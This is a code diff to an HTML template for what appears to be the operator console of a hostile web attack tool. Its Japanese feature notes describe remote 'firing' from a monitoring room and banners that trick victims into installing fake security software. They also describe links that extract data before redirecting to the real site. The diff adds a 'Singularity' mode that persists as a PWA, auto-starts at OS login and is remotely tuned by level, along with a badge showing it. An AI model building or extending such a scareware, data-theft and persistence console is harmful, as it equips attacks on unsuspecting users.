@@ -29,6 +29,7 @@ input.url{flex:1;min-width:190px;font-family:ui-monospace,Menlo,monospace;font-s
 .badge{display:inline-block;font-size:11px;padding:2px 8px;border-radius:999px;
   background:#20242e;border:1px solid #39415a;color:#c7cddb}
 .badge.on{background:#16321f;border-color:#2e6b45;color:#7ee08a}
+.badge.sg{background:#101d18;border-color:#1f5c42;color:#7ee08a;font-weight:700}
 .chk{display:flex;gap:6px;align-items:center;font-size:12px;color:#c7cddb;margin-top:8px}
 .chk input{width:auto;margin:0}
 </style></head><body>
@@ -51,7 +52,8 @@ input.url{flex:1;min-width:190px;font-family:ui-monospace,Menlo,monospace;font-s
   ・発射／停止／枚数は <b>こちらの監視室から遠隔操作</b>。<br>
   ・通知バナーで「偽の対策ソフト」を入れさせられる。入れる先の兵器は作成時に指定。<br>
   ・リンク型は抜き取ったあと本物へ飛ぶ（自爆）。常駐型はホーム画面に追加＝自爆。<br>
-  ・<b>インストール不要</b>。URLをコピー／共有でそのまま渡せる。
+  ・<b>インストール不要</b>。URLをコピー／共有でそのまま渡せる。<br>
+  ・<b>特異点（SINGULARITY）</b>は別格。PWAとして端末に常駐し、OSログイン時に自動起動する。レベルは監視室から0〜5で遠隔操作。
 </div>
 
 <h3>新規作成</h3>
@@ -90,7 +92,11 @@ input.url{flex:1;min-width:190px;font-family:ui-monospace,Menlo,monospace;font-s
     <div class="row">
       <b>{{ r.name }}</b> <span class="mono">{{ r.code }}</span>
       <span class="dim">{{ r.mode_label }}</span>
-      <span class="badge">{{ r.set_label }}</span>
+      {% if r.mode == 'singularity' %}
+        <span class="badge sg">◎ 特異点 L{{ r.level }}</span>
+      {% else %}
+        <span class="badge">{{ r.set_label }}</span>
+      {% endif %}
       {% if r.auto %}<span class="badge on">常駐＝自動発射</span>{% endif %}
       <span class="badge {% if r.firing %}on{% endif %}">{{ '稼働中' if r.firing else '停止中' }}</span>
       <span class="dim">{{ r.hits or 0 }}回</span>
